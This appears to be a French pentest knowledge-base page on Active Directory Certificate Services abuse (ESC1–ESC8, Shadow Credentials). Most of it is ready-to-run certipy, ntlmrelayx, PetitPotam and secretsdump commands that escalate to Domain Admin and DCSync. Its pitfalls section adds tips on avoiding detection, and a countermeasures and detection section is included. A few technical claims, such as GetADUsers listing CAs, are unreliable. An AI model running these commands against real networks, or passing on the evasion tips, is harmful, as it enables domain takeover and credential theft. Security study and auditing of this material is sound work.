---
title: ADCS — Active Directory Certificate Services
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [adcs, active-directory, pki, certipy, esc1, esc8, certificates, pentest, sécurité]
date: 2026-03-22
---

# ADCS — Active Directory Certificate Services

ADCS est l'infrastructure PKI intégrée à Active Directory. Des mauvaises configurations des Certificate Templates permettent d'obtenir des certificats au nom d'autres utilisateurs ou d'usurper des identités jusqu'au Domain Admin. Les vulnérabilités ESC1-ESC8 ont été documentées par Will Schroeder et Lee Christensen (SpectreOps, 2021).

## Concepts fondamentaux

```
Certificate Authority (CA) : émetteur de certificats
  → Enterprise CA : intégrée à AD, utilisée pour l'authentification Kerberos (PKINIT)

Certificate Template : modèle définissant ce que le certificat peut faire
  → Contrôle : qui peut demander, quels EKU, si SAN est autorisé

EKU (Extended Key Usage) — usages autorisés du certificat :
  Client Authentication  (1.3.6.1.5.5.7.3.2)  → authentification AD
  Smart Card Logon       (1.3.6.1.4.1.311.20.2.2)  → idem
  Any Purpose            (2.5.29.37.0)         → tous usages
  SubCA                  → signer d'autres certificats

SAN (Subject Alternative Name) : permet de spécifier l'identité dans le certificat
  → Si l'enrolleur contrôle le SAN → il peut demander un cert au nom de n'importe qui

PKINIT : extension Kerberos permettant l'authentification par certificat
  → Un certificat valide avec Client Authentication → TGT Kerberos
```

## Reconnaissance avec Certipy

```bash
# Certipy — outil Python pour l'audit et l'exploitation ADCS
pip install certipy-ad

# Énumération des templates et CAs (sans authentification spéciale)
certipy find -u alice@domaine.local -p 'Password123' -dc-ip 192.168.1.1

# Sortie JSON + fichier BloodHound compatible
certipy find -u alice@domaine.local -p 'Password123' -dc-ip 192.168.1.1 \
    -json -bloodhound

# Lister seulement les templates vulnérables
certipy find -u alice@domaine.local -p 'Password123' -dc-ip 192.168.1.1 \
    -vulnerable -stdout

# Impacket — lister les CAs via LDAP
python3 -m impacket.examples.GetADUsers -all domaine.local/alice:Password123
```

```
Informations collectées :
  - Certificate Authorities (nom, DNS, flags)
  - Templates : EKU, msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag
  - Permissions : qui peut enroller, qui peut éditer les templates
  - Configurations à risque : ENROLLEE_SUPPLIES_SUBJECT, Any Purpose, no manager approval
```

## ESC1 — SAN arbitraire

La template autorise l'enrolleur à spécifier le SAN → usurpation d'identité.

```
Conditions :
  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT activé (msPKI-Certificate-Name-Flag: 1)
  EKU inclut Client Authentication ou Any Purpose
  Low-privileged users peuvent s'enroller
  Pas d'approbation manager requise

Impact : obtenir un certificat au nom de Domain Admin → s'authentifier en tant que DA
```

```bash
# Exploitation ESC1 avec Certipy
# 1. Demander un certificat au nom d'Administrator
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'VulnerableTemplate' \
    -upn 'administrator@domaine.local' \
    -dc-ip 192.168.1.1

# → Génère administrator.pfx (certificat + clé privée)

# 2. Authentification Kerberos avec le certificat
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1
# → Obtient le hash NTLM de Administrator ET un TGT

# 3. Utiliser le hash NTLM (Pass-the-Hash)
secretsdump.py -hashes :NTLM_HASH domaine.local/administrator@192.168.1.1
```

## ESC2 — Any Purpose EKU

```
Conditions :
  EKU = Any Purpose (2.5.29.37.0) ou pas d'EKU (unrestricted)
  Low-privileged users peuvent s'enroller

Impact : le certificat peut être utilisé pour tout, y compris l'auth client
→ Si SAN non contrôlable → pire que ESC1 pour les cas sans SAN
```

```bash
# ESC2 — demander pour soi-même (l'EKU Any Purpose permet l'auth)
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'AnyPurposeTemplate' \
    -dc-ip 192.168.1.1

certipy auth -pfx alice.pfx -dc-ip 192.168.1.1
```

## ESC3 — Agent d'enrollment

```
Conditions :
  Template A : EKU = Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)
  Template B : autorise les enrollment agents → peut s'enroller pour d'autres

Impact : devenir enrollment agent → demander des certificats au nom d'autres utilisateurs
```

```bash
# Étape 1 — obtenir un certificat d'enrollment agent
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'EnrollmentAgent' \
    -dc-ip 192.168.1.1

# Étape 2 — utiliser ce certificat pour demander un cert au nom d'Administrator
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'TemplateB' \
    -on-behalf-of 'domaine\administrator' \
    -pfx alice.pfx \
    -dc-ip 192.168.1.1
```

## ESC4 — Contrôle de la template

```
Conditions :
  Un utilisateur non-privilégié a WriteProperty/WriteDacl/Owner sur une template

Impact : modifier la template pour la rendre vulnérable (ESC1)
→ Ajouter ENROLLEE_SUPPLIES_SUBJECT, supprimer la validation manager
```

```bash
# Modifier une template pour la rendre vulnérable
certipy template -u alice@domaine.local -p 'Password123' \
    -template 'TargetTemplate' \
    -save-old \
    -dc-ip 192.168.1.1

# Exploiter comme ESC1 ensuite
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'TargetTemplate' \
    -upn 'administrator@domaine.local' \
    -dc-ip 192.168.1.1

# Restaurer la template originale après
certipy template -u alice@domaine.local -p 'Password123' \
    -template 'TargetTemplate' \
    -configuration TargetTemplate.json \
    -dc-ip 192.168.1.1
```

## ESC6 — Flag EDITF_ATTRIBUTESUBJECTALTNAME2

```
Conditions :
  La CA a le flag EDITF_ATTRIBUTESUBJECTALTNAME2 activé
  → Permet de spécifier des SANs dans TOUTES les requêtes de certificats
    (même les templates sans ENROLLEE_SUPPLIES_SUBJECT)

Impact : demander un certificat pour n'importe quelle template avec un SAN arbitraire
```

```bash
# Détecter ESC6 dans le résultat de certipy find
# "User Specified SAN": True sous la CA

# Exploitation : similaire à ESC1 mais sur n'importe quelle template avec Client Auth
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'User' \
    -upn 'administrator@domaine.local' \
    -dc-ip 192.168.1.1
```

## ESC7 — Permissions sur la CA elle-même

```
Conditions :
  Un utilisateur a ManageCA (ou ManageCertificates) sur la CA

Impact :
  ManageCA → activer EDITF_ATTRIBUTESUBJECTALTNAME2 → ESC6
  ManageCertificates → approuver des certificats en attente (pending requests)
```

```bash
# Activer ESC6 via ManageCA
certipy ca -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -enable-editf \
    -dc-ip 192.168.1.1

# Avec ManageCertificates — approuver une requête en attente (ESC7 variant 2)
# 1. Demander un certificat ESC1 (sans approbation auto)
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' -template 'TemplateSensible' \
    -upn 'administrator@domaine.local'
# → Request ID: 42

# 2. Approuver la requête
certipy ca -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' -issue-request 42 -dc-ip 192.168.1.1

# 3. Récupérer le certificat approuvé
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' -retrieve 42 -dc-ip 192.168.1.1
```

## ESC8 — NTLM Relay vers Web Enrollment (AD CS HTTP Endpoints)

```
Conditions :
  L'endpoint HTTP de la CA est exposé (certsrv)
  NTLM authentication activée (pas d'EPA — Extended Protection for Authentication)
  → Relay d'une authentification NTLM capturée vers cet endpoint

Impact : obtenir un certificat au nom de l'utilisateur dont l'authentification est relayée
         Si on relay DC$ → certificat machine du DC → DCSync
```

```bash
# ESC8 — NTLM Relay vers AD CS

# Étape 1 — démarrer ntlmrelayx en mode ADCS
impacket-ntlmrelayx -t http://ca.domaine.local/certsrv/certfnsh.asp \
    -smb2support --adcs \
    --template 'Machine'

# Étape 2 — forcer une authentification NTLM (Responder ou PetitPotam)
# PetitPotam — forcer le DC à s'authentifier
python3 PetitPotam.py -u alice -p 'Password123' attaquant.com dc01.domaine.local

# Étape 3 — récupérer le certificat en base64
# ntlmrelayx affiche : [*] Base64 certificate of user DC01$:  AAAA...

# Étape 4 — utiliser le certificat
echo "AAAA..." | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 192.168.1.1
# → Hash NTLM de DC01$ → DCSync

python3 secretsdump.py -hashes :HASH_NTLM_DC01 'domaine.local/DC01$@192.168.1.1'
```

## Shadow Credentials (attribut msDS-KeyCredentialLink)

```
Alternative aux certificats pour l'exploitation PKINIT :
  Si on a WriteProperty sur msDS-KeyCredentialLink d'un compte → ajouter une clé
  → S'authentifier via PKINIT avec cette clé → obtenir TGT + hash NTLM

Nécessite : Windows Server 2016+ avec ADCS installé
```

```bash
# Pywhisker — manipulation de msDS-KeyCredentialLink
python3 pywhisker.py -d domaine.local -u alice -p 'Password123' \
    --target Administrator --action add --dc-ip 192.168.1.1
# → Génère alice_to_administrator.pfx + password

certipy auth -pfx alice_to_administrator.pfx -dc-ip 192.168.1.1

# Certipy — shadow credentials intégré
certipy shadow auto -u alice@domaine.local -p 'Password123' \
    -account administrator -dc-ip 192.168.1.1
```

## Contre-mesures

```
Protection des templates :
  ✓ Désactiver CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT sur toutes les templates (sauf cas légitimes)
  ✓ Exiger l'approbation manager pour les templates sensibles
  ✓ Auditer les ACLs des templates (bloquer l'écriture par les utilisateurs normaux)
  ✓ Supprimer les templates par défaut non utilisées (User, Computer, SubCA)
  ✓ EKU : ne pas utiliser "Any Purpose" — spécifier l'usage exact

Protection de la CA :
  ✓ Désactiver EDITF_ATTRIBUTESUBJECTALTNAME2 si non nécessaire
  ✓ Restreindre ManageCA et ManageCertificates aux seuls admins ADCS
  ✓ Endpoint HTTP (certsrv) : activer EPA (Extended Protection for Authentication)
  ✓ Activer le HTTPS sur certsrv — rejeter HTTP

Détection :
  ✓ Surveiller les requêtes de certificats avec SAN ≠ identité de l'enrolleur
  ✓ Surveiller les modifications de templates (Event ID 4899, 4900)
  ✓ Surveiller l'utilisation de PKINIT pour des comptes inhabituels
  ✓ Certipy find -vulnerable en mode audit régulier
  ✓ Purple Knight / PingCastle : audit ADCS intégré
```

## Pièges courants

- **ESC1 vs ESC6 — différence subtile** : ESC1 = template autorise SAN supply (`ENROLLEE_SUPPLIES_SUBJECT`). ESC6 = CA accepte SAN supply globalement (`EDITF_ATTRIBUTESUBJECTALTNAME2`). ESC6 est rare mais permet de bypass des templates non-ESC1.
- **Manager Approval ou Authorized Signatures** : un template peut sembler vulnérable ESC1 mais nécessiter une approbation manuelle ou une signature d'enrollment agent. Lire la sortie complète de `certipy find`.
- **Template `User` par défaut** : ne pas confondre avec un template custom modifiable. Les templates par défaut Microsoft sont généralement bien configurés, mais les templates dupliqués pour personnalisation finissent souvent en ESC1.
- **Persistance via PKINIT** : un certificat émis pour un compte reste valide même si le mot de passe change (jusqu'à expiration du cert). `certipy auth` avec un certificat permet de récupérer le hash NT actuel à chaque utilisation.
- **ESC8 nécessite SMB Signing désactivé sur le serveur ADCS** : si IIS sur l'ADCS est en HTTPS strict avec EPA, le relay HTTP → HTTPS échoue. Tester `ntlmrelayx --no-validate-privs`.
- **SAN UPN vs SAN DNS** : pour s'authentifier comme un user, mettre `-upn user@cible.com`. Pour un compte machine, mettre `-dns COMPUTER.cible.com` ET `-upn COMPUTER$@cible.com`. Erreur classique.
- **Certipy nécessite des heures synchronisées** : Kerberos exige une fenêtre de 5 minutes max d'écart. Si le Kali a une horloge décalée par rapport au DC, `certipy auth` échoue. `ntpdate dc.cible.com`.
- **CRL et CT logs** : certains environnements monitoring loggent les certificats émis (Certificate Transparency interne). Émettre un cert "admin" = trace dans le CRL. Préférer Shadow Credentials qui ne passe pas par AD CS.
- **DC Authentication template** : récupérer un cert via `DomainController` template = peut s'authentifier comme le DC$ → DCSync immédiat. Mais aussi très repérable (qui demande un cert DC ?).
